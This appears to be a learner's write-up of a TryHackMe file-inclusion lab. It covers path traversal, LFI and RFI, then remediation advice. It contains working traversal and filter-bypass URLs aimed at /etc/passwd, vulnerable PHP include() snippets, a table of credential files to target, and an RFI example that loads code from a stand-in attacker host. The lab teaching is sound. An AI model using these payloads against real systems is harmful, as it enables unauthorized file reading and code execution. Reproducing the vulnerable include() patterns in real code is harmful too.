# 🚨 File Inclusion 🚨

## 📌 Task 1: Introduction

### 🧐 What is File Inclusion?

File inclusion vulnerabilities allow attackers to access unauthorized files on a server due to improper input validation. Main types:

* 🔹 **Local File Inclusion (LFI)**
* 🔹 **Remote File Inclusion (RFI)**
* 🔹 **Directory Traversal**

### 🛠️ How File Inclusion Occurs:

* Directly using user-controlled input in file handling functions without validation.

### ⚠️ Risks:

* 🔓 Sensitive data leakage
* 💻 Remote Command Execution (RCE)

### 🌐 URL Breakdown

![URL Breakdown](https://github.com/user-attachments/assets/a25027b5-fc86-4bab-babe-655a4f2322bb)

### 📑 Example Scenario

![Example Scenario](https://github.com/user-attachments/assets/8fef0c16-076f-48b3-a315-89e822508a89)

---

## 📌 Task 2: Deploy the VM

* 📥 Deploy the provided VM.
* 🌐 Access via TryHackMe network or AttackBox:

![VM Deployment](https://github.com/user-attachments/assets/43085e65-4553-481f-8951-40cc56568287)

---

## 📌 Task 3: Path Traversal

Directory traversal exploits let attackers access files outside the web root by URL manipulation.

### 🔍 Exploitation Examples

**Linux Example:**

```
http://webapp.thm/get.php?file=../../../../etc/passwd
```

**Windows Example:**

```
http://webapp.thm/get.php?file=../../../../windows/win.ini
```

### 📈 Visualization

**Attack Process**

![Path Traversal Attack](https://github.com/user-attachments/assets/0e6eb5f4-3142-4507-bd6f-1302c9bf4142)

**Directory Traversal Illustration**

![Directory Traversal](https://github.com/user-attachments/assets/1d60c63e-9cef-4e0c-9356-c6b950d85f13)

**Final Outcome**

![Final Outcome](https://github.com/user-attachments/assets/5b9ad3e9-ec92-44b9-a761-5d9871730a6e)

### 📋 Common Files for Exploitation:

| File Path                     | Description             |
| ----------------------------- | ----------------------- |
| `/etc/passwd`                 | System user information |
| `/etc/shadow`                 | User passwords          |
| `/root/.bash_history`         | Root command history    |
| `/var/log/apache2/access.log` | Apache server logs      |
| `C:\boot.ini`                 | Windows boot options    |

---

## 📌 Task 4: Local File Inclusion (LFI)

LFI occurs with improper use of file handling functions like `include`, `require`, etc.

### ⚙️ PHP Examples:

```php
include($_GET["lang"]);
```

**Exploitation:**

```
http://webapp.thm/index.php?lang=../../../../etc/passwd
```

### 📂 Directory Specified Scenario:

```php
include("languages/". $_GET['lang']);
```

**Payload:**

```
http://webapp.thm/index.php?lang=../../../../etc/passwd
```

---

## 📌 Task 5: Advanced LFI Techniques

### 1️⃣ Error Message Analysis

Analyze errors for path disclosure.

**Payload:**

```
http://webapp.thm/index.php?lang=../../../../etc/passwd%00
```

### 2️⃣ Filter Bypass

Use Null Byte (`%00`) or current directory (`/.`).

**Payload:**

```
http://webapp.thm/index.php?lang=/etc/passwd%00
```

### 3️⃣ Traversal Filter Bypass

Repeated patterns bypass:

```
http://webapp.thm/index.php?lang=....//....//....//etc/passwd
```

![Filter Bypass](https://github.com/user-attachments/assets/1dbd7386-91b7-47ec-bdb5-590b7c8a3dd5)

### 4️⃣ Directory Enforcement Bypass

Include directory in payload:

```
http://webapp.thm/index.php?lang=languages/../../../../etc/passwd
```

---

## 📌 Task 6: Remote File Inclusion (RFI)

RFI executes remotely hosted files. Requirements:

* `allow_url_fopen` in PHP set to `on`

### 🚩 Exploitation Example:

1. 🖥️ Malicious file (`http://attacker.thm/cmd.txt`):

```php
<?php echo "Hello THM"; ?>
```

2. 🌐 Inclusion via URL:

```
http://webapp.thm/index.php?lang=http://attacker.thm/cmd.txt
```

![RFI Attack Illustration](https://github.com/user-attachments/assets/5774be06-8423-4696-b299-910d6b00808f)

---

## 📌 Task 7: Remediation

### 🛡️ Best Practices:

* ✅ Keep software updated
* ✅ Disable PHP error display
* ✅ Use Web Application Firewall (WAF)
* ✅ Disable unnecessary PHP options (`allow_url_fopen`, `allow_url_include`)
* ✅ Validate and sanitize inputs
* ✅ Whitelist/blacklist file access

---

## 📌 Task 8: Challenge

### 🧑‍💻 Testing Steps:

1. 🎯 Identify entry points
2. ✅ Test valid inputs
3. ❌ Test invalid inputs and special characters
4. 🔧 Utilize browser and Burp Suite tools
5. 🖥️ Analyze error messages
6. 🛠️ Determine filters and validation
7. 🎯 Craft payloads for sensitive file access

🔗 **Challenge Access:**

[http://MACHINE\_IP/challenges/index.php](http://MACHINE_IP/challenges/index.php)

🎉 **Happy Hacking!** 🎉
